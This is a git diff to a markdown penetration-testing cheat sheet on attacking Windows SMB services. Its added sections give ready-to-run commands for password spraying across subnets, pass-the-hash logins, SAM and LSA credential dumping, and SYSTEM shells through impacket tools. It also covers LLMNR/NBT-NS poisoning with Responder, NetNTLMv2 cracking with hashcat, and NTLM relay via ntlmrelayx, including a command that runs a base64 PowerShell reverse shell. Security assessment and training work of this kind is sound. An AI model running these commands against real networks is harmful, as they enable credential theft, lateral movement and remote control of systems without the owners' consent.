@@ -10,14 +10,31 @@
 ```bash
 nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
 nxc smb 10.10.10.10
-enum4linux-ng -A 10.10.10.10
+enum4linux-ng -A -C 10.10.10.10
 ```
+
+---
+
+## Authentication
+
+Verify user privileges and acess on systems
+
+```sh
+nxc smb 10.10.10.100 -u localuser -p 'Password' --local-auth    # single auth
+nxc smb 10.10.10.0/24 -u localuser -p 'Password' --local-auth   # subnet spray
+nxc smb 10.10.10.100 -u Administrator -H 'hash' --local-auth    # pass the hash
+```
+
+By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list.
 
 ---
 
 ## User Enumeration
 
 ```bash
+#  Lists users currently logged into the machine and which DC they connected to
+nxc smb 10.10.10.10 -u <user> -p <password> --loggedon-users  # Use CIDR notation to scan subnets (10.10.10.0/24)
+
 # RID brute — works on many DCs even with null/guest
 nxc smb 10.10.10.10 -u '' -p '' --rid-brute
 nxc smb 10.10.10.10 -u <user> -p <password> --rid-brute
@@ -27,7 +44,7 @@ nxc smb 10.10.10.10 -u <user> -p <password> --users
 enum4linux-ng -U 10.10.10.10
 
 # Direct LSARPC
-lookupsid.py 'EXAMPLE/<user>:<password>'@10.10.10.10
+impacket-lookupsid 'EXAMPLE/<user>:<password>'@10.10.10.10
 ```
 
 ---
@@ -46,6 +63,7 @@ enum4linux-ng -P 10.10.10.10
 ## Share Enumeration
 
 ```bash
+smbclient -N -L //10.10.10.10      # display shares using null session
 smbclient -L //10.10.10.10 -U ''
 smbclient -L //10.10.10.10 -U guest
 nmap --script smb-enum-shares -p 445 10.10.10.10
@@ -165,16 +183,16 @@ Reach for the impacket tools when you need an **interactive shell** — `nxc -x`
 
 ```bash
 # Full SYSTEM shell — drops binary + creates service (noisy, but reliable)
-impacket-psexec EXAMPLE/<user>:<password>@10.10.10.10
+impacket-psexec user:'password'@10.10.10.10
 
 # DCOM/WMI semi-interactive — quieter than psexec
-impacket-wmiexec EXAMPLE/<user>:<password>@10.10.10.10
+impacket-wmiexec user:'password'@10.10.10.10
 
 # Semi-interactive via SMB named pipes — no binary on disk
-impacket-smbexec EXAMPLE/<user>:<password>@10.10.10.10
+impacket-smbexec user:'password'@10.10.10.10
 
 # One-shot via scheduled task — useful when 445 is filtered but RPC/135 is open
-impacket-atexec EXAMPLE/<user>:<password>@10.10.10.10 'whoami'
+impacket-atexec user:'password'@10.10.10.10 'whoami'
 ```
 
 All accept `-hashes :<ntlm-hash>` for pass-the-hash and `-k -no-pass` for Kerberos with a cached ticket.
@@ -184,9 +202,84 @@ All accept `-hashes :<ntlm-hash>` for pass-the-hash and `-k -no-pass` for Kerber
 ## Credential Dumping
 
 ```bash
+nxc smb 10.10.10.100 -u localuser -p 'Password' --sam
+```
+
+CIDR notation can be used instead to spray a subnet (10.10.10.0/24)
+Use `--lsa` in addition to the command above to dump SAM and LSA simultaneously
+
+
+```bash
 impacket-secretsdump EXAMPLE/<user>@10.10.10.10
 impacket-secretsdump EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>
 ```
+
+---
+
+## Forced Authentication
+
+When a Windows host can't resolve a name via DNS, it falls back to multicast: **LLMNR**, **NBT-NS**, **mDNS**. Anything on the broadcast domain can answer and impersonate the requested host. The victim then sends a NetNTLMv2 authentication attempt to the attacker, which can be cracked offline or relayed live. Common trigger: a user mistypes a UNC path (`\\fileshare` → `\\fileshre`).
+
+### Capture
+
+Run in *analyze mode* first — passively observes poisonable traffic without spoofing, useful for confirming the attack is viable before being noisy:
+
+```bash
+sudo responder -I eth0 -A
+```
+
+Then run for real:
+
+```bash
+sudo responder -I eth0
+```
+
+Captured hashes land in `/usr/share/responder/logs/` (one file per protocol/host). A NetNTLMv2 hash looks like:
+
+```
+demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A...:01010000...
+```
+
+Crack with hashcat — mode `5600` for NetNTLMv2, `5500` for NetNTLMv1:
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+!!! tip "Multiple hashes for one user"
+    NetNTLMv2 includes a randomized client+server challenge, so the same password produces a different hash each capture. They all crack to the same plaintext.
+
+### Relay
+
+If the password is strong, *relay* the auth to a target that doesn't enforce SMB signing instead of cracking it. Disable Responder's own SMB (and HTTP, if relaying HTTP-triggered auth) so the auth passes through to ntlmrelayx:
+
+```bash
+# /etc/responder/Responder.conf
+SMB  = Off
+HTTP = Off
+```
+
+Build the relay target list (only hosts where signing is not required):
+
+```bash
+nxc smb 10.10.10.10/24 --gen-relay-list relay_targets.txt
+```
+
+Then run responder and ntlmrelayx side by side:
+
+```bash
+# Default behavior: dump SAM as the relayed user (needs local admin on target)
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10
+
+# Execute a command — paste a base64-encoded PowerShell rev shell from revshells.com
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e <base64>'
+
+# Multi-target list
+impacket-ntlmrelayx --no-http-server -smb2support -tf relay_targets.txt
+```
+
+!!! tip "Real-world"
+    LLMNR and NBT-NS are usually disabled by GPO in well-managed environments; mDNS rarely is. One misconfigured host or one user mistyping a share name is enough. When you already have low-priv creds and want to force auth from a specific target, pair this with coercion (`PetitPotam.py`, `dfscoerce.py`, `coercer`) instead of waiting for organic mistypes.
 
 ---
 
@@ -213,7 +306,7 @@ exploit
 
 ### SMBGhost (CVE-2020-0796)
 
-SMBv3.1.1 compression bug — affects unpatched Windows 10 1903/1909 and Server 2004/1909. Public RCE PoCs are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.
+SMBv3.1.1 compression bug — affects unpatched Windows 10 1903/1909 and Server 2004/1909. [POCs](https://www.exploit-db.com/exploits/48537) are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.
 
 ```bash
 nmap -p 445 --script smb-protocols 10.10.10.10   # confirm SMB 3.1.1 with compression
@@ -232,3 +325,8 @@ If vulnerable: back up the DC machine account hash with `secretsdump.py`, run a 
 
 !!! tip "Real-world"
     SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
+
+---
+
+## Useful Links
+[SANS SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
